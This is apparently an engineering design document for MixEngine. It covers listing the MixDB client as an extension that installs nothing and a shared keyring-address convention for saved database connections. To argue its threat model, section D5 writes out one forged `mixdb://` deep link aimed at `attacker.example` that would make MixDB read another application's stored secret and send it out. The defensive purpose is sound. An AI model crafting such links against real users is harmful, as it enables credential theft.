# T84 — MixDB in the registry, and one keyring both applications read (design)

Roadmap task **T84**, phase 8, and the last of it. T83 found MixDB on three systems and handed it
one database with the password in the started process's environment and nowhere else. It left two
things behind, both named in its closing paragraph and both in
[features/extensions.md](../../../.claude/features/extensions.md)'s integration list: **MixDB in the
registry**, so `mix extension install mixdb` is the way it arrives rather than a directory somebody
has on their disk, and **one keyring convention**, so a connection saved in MixDB points at
MixEngine's credential instead of holding a second copy of it.

## Goal

`mix extension install mixdb` installs the entry the roster publishes, says whether the application
is on this machine and where to get it when it is not, and leaves `mix database open` working
exactly as T83 built it. And a connection the user saves in MixDB after that handoff holds **no
password**: it holds the address of MixEngine's, `mixengine` / `mariadb@main/root`, which MixDB reads
at connect time. Rotating or removing the credential in MixEngine is therefore a change MixDB sees,
rather than a copy it goes on presenting.

## Measured, not assumed

Every line below was read off this workspace, off the neighbouring `mixdb` and `mixengine-packages`
checkouts, or off the machine this was designed on.

- **MixDB publishes four artifacts and none of them is an archive.** `.github/workflows/release.yml`
  builds `nsis`, `dmg`, `appimage` and `deb` — a Windows installer, a disk image, an AppImage and a
  Debian package. `tauri.conf.json`'s `bundle.targets` says the same. There is no portable `.zip`
  and no `.tar.gz` of the application. macOS is one universal bundle; Linux is built on
  `ubuntu-22.04` and is x86-64 only.
- **MixDB self-updates.** `plugins.updater.endpoints` is
  `https://github.com/mixnz/mixdb/releases/latest/download/latest.json`, `createUpdaterArtifacts` is
  on, and the release notes say every platform but the `.deb` updates itself. An installed copy
  moves without asking MixEngine.
- **MixDB now registers `mixdb://` with the operating system.** `tauri.conf.json` declares
  `plugins.deep-link.desktop.schemes = ["mixdb"]`. T83 measured the opposite — *"a `mixdb://` URL
  handed to the operating system today lands in a 'no application' dialog"* — and that measurement
  has expired. It is the single most important line in this document: from here on **a `mixdb://`
  URL is something any web page can make the user's own MixDB receive.**
- **MixDB already implements T83's receiving side.** `src-tauri/src/launch.rs` reads the URL from
  `argv` and the variable from the environment on the first line of `run()` and removes it;
  `src-tauri/src/modules/db/handoff.rs` parses the URL. Its `credential_name` refuses a
  `password_env` outside `MIX…_…PASSWORD`, with the comment *"once the scheme is registered with the
  OS, any web page can produce a `mixdb://` link naming any variable"*. The guard this design needs
  already has a precedent on the other side.
- **MixDB keeps its own passwords in the OS store under `MixDB`.** `src-tauri/src/secrets.rs`:
  service `"MixDB"`, account the connection's uuid, and on macOS every connection folded into one
  `vault` item because the Keychain asks per item and MixDB is unsigned. A handed-off connection
  saved today writes the password there — the duplication this task removes.
- **MixEngine's own address is `("mixengine", "<service-id>/<user>")`.**
  `mixengine_platform::KEYRING_SERVICE` is the namespace,
  `generate::recipe::Context::secret_address` composes the key, `first_run` writes it and
  `services::databases::read` reads it. Every recipe that has an administrator goes through both.
- **Only half of that address is on the wire.** `DatabaseAccount.secret` and
  `DatabaseHandoff.secret` are `String` and carry the key. The namespace exists in
  `mixengine-platform` and in no response, so anything outside this workspace has to hardcode it.
- **An artifactless entry already installs.** `extensions::install::artifact_for_host` answers
  `Ok(None)` when `manifest.artifacts` is empty, and `install` then creates the directory and writes
  the row. Nothing in `plan`, `install`, `list` or `available` refuses a `desktop-app` with no
  artifact — the registry half needs no new machinery, only an honest entry and honest surfaces.
- **`extension.install` answers a `JobSummary`, not a report**, and `mix extension install` reads
  `extension.plan` first in order to build the consent. The plan is where a person is standing when
  they decide, and the only structured thing the CLI holds afterwards.
- **`ExtensionPlan` carries no `homepage`.** `ExtensionInspection` does. For a kind whose whole
  answer may be *"go and get it"*, the plan is missing the sentence's object.
- **The fixture is the roster file.** `crates/mixengine-testkit/fixtures/extensions/mixdb.toml`
  exists and says `version = "0.4.0"` with a description naming MongoDB; `mixengine-packages`'
  `data/extensions/` holds `mailpit`, `phpmyadmin` and `adminer` and no `mixdb`, and its README says
  a change belongs in both places. The fixture is a plausible-looking file describing no released
  software: MixDB's version is `0.0.28`, its identifier `io.github.haiquang9994.mixdb`, its binary
  `mixdb`.
- **T83's Windows measurement stands**: this machine's MixDB is `HKCU\…\Uninstall\MixDB` with
  `DisplayIcon = "…\AppData\Local\MixDB\mixdb.exe"`, and there is no App Paths entry. The file the
  installer writes is `mixdb.exe`.

## Scope

**In:**

- `mixengine-proto` — `KEYRING_SERVICE` moves here, the layer that owns the wire;
  `SecretAddress { service, key }`; `DatabaseAccount.secret` and `DatabaseHandoff.secret` become it;
  `DatabaseClientReport` gains one; `DesktopPresence`; `ExtensionPlan` gains `homepage` and
  `client`.
- `mixengine-platform` — `pub use mixengine_proto::KEYRING_SERVICE;` from where the constant was, so
  no caller changes.
- `mixengine-core` — `services::handoff::url` renders `secret_key`; `Connection` carries it.
- `mixengine-daemon` — the plan fills `client` for a `desktop-app` and nothing else; `database.*`
  answers the whole address.
- `mixengine-cli` — the plan's render says whether the application is here, and `mix extension
  install` repeats it after a successful install of a `desktop-app`; the database renders name both
  halves.
- `mixengine-testkit` — `fixtures/extensions/mixdb.toml` becomes the real MixDB.
- Documentation: [features/extensions.md](../../../.claude/features/extensions.md) — the integration
  list's items 3 and 4, the keyring contract beside T83's handoff contract, and what a `desktop-app`
  entry is; [features/client-surface.md](../../../.claude/features/client-surface.md);
  [architecture/daemon-and-ipc.md](../../../.claude/architecture/daemon-and-ipc.md) where the
  `database.*` shapes are described; the roadmap.

**Also, in the `mixnz/mixengine-packages` repository** (a separate change, in the repository that
owns the roster — [features/extensions.md](../../../.claude/features/extensions.md)'s *"no extension
manifest is compiled into MixEngine"*): `data/extensions/mixdb.toml`, byte-identical to the fixture,
and the README's list of what is published.

**Out:**

- **MixEngine installing MixDB.** D1. The entry names no artifact, and the reasons are three.
- **MixDB's side of the convention.** Storing a reference instead of a password, and refusing to
  honour one that arrived on a deep link, is work in the `mixdb` repository. This design writes the
  contract (D7) and changes nothing there — the coupling stays one-directional.
- **A second `desktop-app`.** Nothing installs two, and T83's *"the first by id is the client"*
  stands.
- **Reaching a stopped server.** A MixDB opened by hand, days later, on a connection whose reference
  still resolves, meets a server T69 stopped for idleness. Named in the risks; the activator is for
  HTTP and not for a database port.

## Decisions

### D1 — A `desktop-app` entry names no artifact, and the entry *is* the identity

[features/extensions.md](../../../.claude/features/extensions.md) offers *"MixDB's own release
artifacts listed as a `desktop-app` extension so users can install it from inside MixEngine"*. This
task refuses the installing half, and keeps the listing half, for three reasons that are each
sufficient on their own.

- **There is nothing to unpack.** MixDB publishes an NSIS installer, a disk image, an AppImage and a
  Debian package (measured). `crate::install::Installer` verifies a hash and unpacks an archive, or
  — since T82's `NotAnArchive::OneFile` — renames one file into place. A `.dmg` is a filesystem, a
  `.deb` is an `ar` archive whose contents belong at `/usr`, and an NSIS `.exe` is a program. None of
  them is an archive of an application.
- **Running a downloaded installer is arbitrary code, and this workspace has a rule about that.**
  `CLAUDE.md`'s *"`mixengine-elevate` never runs arbitrary commands, validates every request itself
  rather than trusting the daemon"*. An extension mechanism that executes a program upstream
  published would be that boundary's opposite, arriving through the door built for supervised
  services.
- **MixDB updates itself.** Its updater points at its own releases and every platform but the `.deb`
  takes new versions without asking. MixEngine installing a version would be a second updater,
  immediately and permanently behind the first, with no way to tell the two apart.

So a `desktop-app` entry carries what MixEngine needs in order to *find and speak to* an application
somebody else installed: `[desktop-app].scheme`, `[desktop-app.detect]`'s per-OS hints, and
`[extension].homepage` — where to get it. That is what T80 put in the format, and this task is the
first to publish one. The manifest doc for `DesktopApp` says it in one line, so the next person to
write an entry is not left deciding.

### D2 — The plan says whether the application is here, because that is the only question this kind raises

Installing a `desktop-app` writes a row and creates an empty directory. On a machine without MixDB
that is a success that produced nothing a person can see, and the state that explains it —
T83's `DesktopClient` — is only reachable through `database.client`, which needs a database service
to ask about.

`ExtensionPlan` gains two fields:

- `homepage: Option<String>` — the manifest's, for every kind. The plan is where a person decides,
  and *"where is this from"* is part of deciding.
- `client: Option<DesktopPresence>` — filled by the daemon for kind `desktop-app` and left `None`
  for every other kind, so nothing else pays for a registry walk or a Spotlight query.

`DesktopPresence` is deliberately **not** `DesktopClient`. That enum answers *"which client would
open this database"* and carries the extension's id and name in both arms plus a `no_client` arm
that cannot arise here: in a plan the extension is the subject. Two arms and one field each:

| `DesktopPresence` | Meaning |
| --- | --- |
| `installed { program }` | The application is on this machine, at this path |
| `not_installed { searched }` | It is not, and this is where this system looked |

The CLI renders it before consent — *"MixDB is not on this machine (looked in App Paths and the
uninstall table). Get it at https://github.com/mixnz/mixdb"* — and repeats it after a successful
install, out of the plan it already holds, because `--yes` skips the first. This is the whole of
what the registry half adds to the product, and it is deliberately small: the machinery T81 and T83
built already carries the rest.

### D3 — The version in a `desktop-app` entry is the entry's, and the surfaces say so

`[extension].version` is required by the format and MixDB self-updates, so a roster that says
`0.0.28` will be describing a machine running `0.0.31` within a week. Nothing here tries to fix
that by reading the installed application's version — that means a per-OS metadata read for a number
nothing uses.

What is done instead is to stop the number being read as a claim about the machine: for a
`desktop-app`, `mix extension plan` and `mix extension install` print the presence line beside the
version, so the version is visibly the entry's and the presence is visibly the machine's. The
manifest documentation says the same sentence. Raising the roster's version is then what it is for
every other extension — a change in `mixengine-packages` — and it costs nothing when it is late.

### D4 — The hints are what the installers actually write

The fixture's `MixDB.exe` and `version = "0.4.0"` describe no released software. The entry becomes:

```toml
version = "0.0.28"
homepage = "https://github.com/mixnz/mixdb"

[desktop-app]
scheme = "mixdb"

[desktop-app.detect]
windows = "mixdb.exe"
macos   = "io.github.haiquang9994.mixdb"
linux   = "mixdb.desktop"
```

`mixdb.exe` is the file Tauri's NSIS installer writes into `%LOCALAPPDATA%\MixDB` (measured, T83 and
again here); both Windows routes match case-insensitively, so the hint spelled as the file is spelled
loses nothing and stops the entry describing a file name nobody has. `io.github.haiquang9994.mixdb`
is `tauri.conf.json`'s identifier, which is what the `.dmg` writes into the bundle and what Spotlight
indexes. `mixdb.desktop` is what the `.deb` writes, from the crate's binary name.

**An AppImage nobody integrated is `not_installed`, and that is honest.** An AppImage is a file in a
downloads directory with no desktop entry until something writes one; MixEngine looks in the XDG
`applications` directories and answers where it looked. Making it work would mean guessing at paths
the user chose, which is the opposite of a hint the manifest declares.

### D5 — The namespace is the convention; the key is the message

This is the decision the measured deep-link registration forces, and it is the one worth reading.

The obvious shape for *"one service-name convention so both apps read the same stored credentials"*
is to put the whole address in the handoff URL, the way `password_env` puts the variable's name
there:

```
…&secret_service=mixengine&secret_key=mariadb%40main%2Froot        ← refused
```

**Refused, because MixDB now registers `mixdb://` with the operating system.** A URL a web page
produces reaches the running MixDB. If the URL may name the credential store's namespace, then a
page can send

```
mixdb://connect?kind=mysql&host=attacker.example&port=3306&user=x
                &secret_service=Chrome%20Safe%20Storage&secret_key=…
```

and MixDB reads an unrelated application's secret out of the user's own credential store and sends
it to a stranger's server as a password. The store is readable by every process running as that
account on Windows and Linux; the only thing standing between a page and any secret on the machine
would be a field in a URL.

So the address is split by who may say it:

- **The namespace — `mixengine` — is a convention both applications hold**, compiled in on each
  side and published as a constant (D6). It is never on the wire, so nothing can name a different
  one.
- **The key — `mariadb@main/root` — travels**, as `secret_key`, present exactly when `user` is,
  beside the `password_env` T83 put there. A forged URL naming a key can only ever address
  MixEngine's own namespace, which is the same set of entries it could reach anyway by naming a
  `label` and a `user`; it adds no reach.

The key travels rather than being derived from `label` and `user` because the composition
(`<service-id>/<user>`) is then MixEngine's alone to change. A rule spelled out on both sides is a
rule that drifts; a string handed over is not.

**Why `password_env` may travel and an address may not.** An environment variable exists only in a
process MixEngine started, so a forged URL delivered to a *running* MixDB names a variable that is
not there and gets nothing. A keyring entry is always there. That asymmetry is the whole argument,
and it is why MixDB's existing `MIX…_…PASSWORD` check is not the pattern to copy here.

### D6 — The whole address goes on the wire, because a client that composes it is the duplication this task removes

`DatabaseAccount.secret` says `mariadb@main/root` and no response anywhere says `mixengine`. A
graphical client that wanted to show *"the password is in your credential store, here"* has to
hardcode the namespace — which is exactly the second copy item 4 exists to delete, and exactly what
`CLAUDE.md`'s *"no business logic in clients"* forbids.

`KEYRING_SERVICE` therefore **moves to `mixengine-proto`**, which is where the wire's vocabulary
lives and where `EnvValue::Keyring`'s `service` field — whose every value is this constant — already
is. `mixengine-platform` re-exports it from `traits::keyring`, so every existing caller and both of
its feature gates are untouched.

```rust
pub struct SecretAddress {
    pub service: String,   // KEYRING_SERVICE
    pub key: String,       // "mariadb@main/root"
}
```

A struct rather than one string with a separator: the two halves are two fields, so there is no
separator to pick and nothing to split wrong when a key contains the character somebody chose.
`SecretAddress::of(key)` fills the namespace, so nothing composes one by hand.

And the key half gets one composition too. `services::handoff::secret_key(service, user)` is
`<service-id>/<user>`, and `generate::recipe::Context::secret_address` — which has been that
composition since T77a — calls it rather than spelling it a second time. The convention published to
another application must not be a `format!` that agrees with a different `format!` by inspection.

It replaces `secret` on `DatabaseAccount` and on `DatabaseHandoff`, and is **added** to
`DatabaseClientReport` as `secret: Option<SecretAddress>` — the administrator's, `None` for a server
with no accounts and for a service no client opens. That last is what makes the convention
*askable*: `database.client` starts nothing, opens nothing and touches the keyring not at all
(T83's D6, unchanged — the address is composed from the recipe, never looked up), so a client can
draw *"stored in your credential store as …"* beside the button without opening a database to find
out.

### D7 — What the receiving side owes, written down as a contract

Three rules, into `features/extensions.md` beside T83's, because the value of a convention is that
both sides can be held to it.

1. **A saved connection holds the address, not the password.** MixDB writes
   `{ service, key }` into its own `connections.json` — which is plain text by its own design, and
   an address is a name — and reads the value from the OS store at connect time. Nothing MixEngine
   generated is copied into MixDB's `MixDB` namespace.
2. **A reference may only be attached to a handoff that arrived on `argv` of a fresh process.** Not
   to a `mixdb://` URL delivered to a running instance, whatever it says — D5's reason, and the rule
   MixDB's own `credential_name` comment already states for `password_env`. A URL that arrives any
   other way opens a form; it does not reach the credential store.
3. **A read that finds nothing falls back to asking.** MixEngine removes an entry when the thing it
   belongs to is removed, so a reference outliving its credential is an ordinary end and not a
   failure to report. The empty answer `Keyring::secret` already gives is the shape.

And what MixEngine owes, in the same place: the address is **stable for the life of the account** —
it is composed from the service id and the account name, both of which are what the account *is*;
nothing rotates a credential in place; and an entry is removed only with what it belongs to.

### D8 — The fixture and the roster file are one file, and it is the roster's

`mixengine-packages`' README already says a manifest change belongs in both places. This task makes
the MixDB pair exist and match: `crates/mixengine-testkit/fixtures/extensions/mixdb.toml` here, and
`data/extensions/mixdb.toml` there. The generator renders the roster through this build's own
`manifest::read`, so a file that this repository's tests accept is a file that publishes.

The two changes are two commits in two repositories because they are two repositories; the roster's
is what makes `mix extension available` list MixDB, and it lands after this one, since the generator
is built from a checkout of `mixnz/mixengine` and the entry must be one that build can read. Nothing
in this repository depends on the roster having it: `--path` installs the same file.

## Data flow

```
mix extension install mixdb
  cli:    extension.plan { source: registry("mixdb") }
  daemon: registry listing → manifest, signed
          install::plan  → id, version, permissions, dirs
          kind == desktop-app?  host.desktop_apps().locate("mixdb.exe")   [spawn_blocking]
                                 → Installed(app)   → client: installed { program }
                                 → NotInstalled{s}  → client: not_installed { searched: s }
  cli:    renders the plan, the presence line and the homepage; asks; sends the consent
  daemon: extension.install → job → no artifact → directory + row
  cli:    "MixDB is not on this machine … get it at https://github.com/mixnz/mixdb"

mix database open mariadb@main --user blog
  daemon: … as T83 …
          handoff::url(scheme, address, user, database, secret_key)
            mixdb://connect?kind=mysql&host=127.0.0.1&port=3306&user=blog&database=blog
                            &label=mariadb%40main&password_env=MIXENGINE_DB_PASSWORD
                            &secret_key=mariadb%40main%2Fblog
          launch(program, [url], { MIXENGINE_DB_PASSWORD: password })
  answer: { …, secret: { service: "mixengine", key: "mariadb@main/blog" }, launched: … }

  mixdb:  argv[1] → the URL; the variable → the password, then unset          (out of repo)
          Save → connections.json holds { service: "mixengine", key: "…/blog" } and no password
          later connects → OS store, ("mixengine", "mariadb@main/blog")       (out of repo)
```

## Testing

Where the rule lives, per [.claude/standards/testing.md](../../../.claude/standards/testing.md).

**Unit, `mixengine-proto`.** `SecretAddress::of` fills the namespace and nothing else;
`DatabaseAccount` and `DatabaseHandoff` encode `secret` as an object with both halves; a
`DatabaseClientReport` for a server with no accounts omits it. `DesktopPresence` encodes as a tagged
enum, both arms.

**Unit, `mixengine-core`.** `handoff::url` carries `secret_key` percent-encoded — `mariadb@main/blog`
becomes `mariadb%40main%2Fblog` — present exactly when `user` is, and absent for Redis; the rendered
URL still contains no `password=`, which is T83's assertion and stays. And a **guard test**: what
`Context::secret_address` answers, what `handoff::secret_key` answers and what the URL carries are
one string for one account, so the convention cannot drift inside this workspace without a red test.

**Unit, `mixengine-core::extensions::manifest`.** The real `mixdb.toml` fixture reads, is
`Body::DesktopApp`, declares no artifact, and its three hints are the three measured strings — the
test that makes D4 a fact rather than a paragraph.

**Component, `mixengine-daemon`.** `extension.plan` over the fixture on `mock::Host::with_desktop_app`
answers `client: installed` with the program; over the default host answers `not_installed` with a
non-empty `searched`; over a `service` kind (Mailpit's fixture) answers `client: None` and the host's
locator is never called. `database.client` for `mariadb@main` answers
`secret: { service: "mixengine", key: "mariadb@main/root" }` and the mock keyring records no read;
for `redis@main` it answers none.

**CLI, `crates/mixengine-cli/tests/`.** `mix extension plan --path <mixdb fixture> --json` on all
three systems through the real locator: `client.state` is `not_installed` and `searched` is this
system's own sentence, because no CI machine has MixDB — the (P) shape T83's `database.rs` already
uses. And the human render says the homepage. `mix database open`'s existing suite gains the
`secret_key` assertion.

**The real run, `crates/mixengine-cli/tests/mariadb.rs`, Linux only.** The script the desktop entry
points at already records its first argument; the assertion grows to say the URL names
`secret_key=mariadb%40main%2Froot`, and — unchanged and still the point — that it never records the
value of anything.

## Risks, and where each is answered

| Risk | Answer |
| --- | --- |
| A web page makes MixDB read an arbitrary secret and post it to a server | D5 — the namespace is never on the wire; the key reaches only MixEngine's own entries |
| A web page makes MixDB read *MixEngine's* secret and post it | D7 rule 2 — a reference is attached only to a handoff that arrived on `argv` of a fresh process |
| A person installs `mixdb` and nothing happens | D2 — the plan and the install both say whether the application is here, and where to get it |
| The roster's version is behind the installed application | D3 — it is the entry's version, said as one; the presence line is what describes the machine |
| MixEngine is expected to install MixDB and does not | D1 — three reasons, and the surfaces say *find*, never *install* |
| A reference outlives its credential | D7 rule 3 — an empty read is an ordinary end, and MixDB asks |
| An AppImage MixDB is never found | D4 — `not_installed` naming where this system looked; integrating an AppImage is the user's own step |
| A saved connection meets a server T69 stopped for idleness | Out of scope, named above: the on-demand activator is for HTTP and not for a database port. MixEngine's own road to the server is `mix database open` |
| Two namespaces drift apart inside this workspace | The guard test above, and one constant in `mixengine-proto` re-exported rather than restated |
| macOS asks before letting MixDB read the entry | It should: the Keychain guards per item, and one dialog is the user consenting to exactly this. `mixdb`'s vault note describes the same machinery |

## What this leaves

[features/extensions.md](../../../.claude/features/extensions.md)'s MixDB list is finished: detect
and launch (T83), the connection handoff (T83), the registry entry (here, with the honest limit that
MixEngine finds MixDB rather than installing it), and one keyring convention (here). Milestone M8's
*"open its database in MixDB"* has everything on this side of the line.

What `mixdb` owes is D7: save the address, not the password; honour a reference only from a real
handoff; ask again when the entry is gone. And `mixengine-packages` owes `data/extensions/mixdb.toml`
and a run of `release/publish-extensions.sh`.
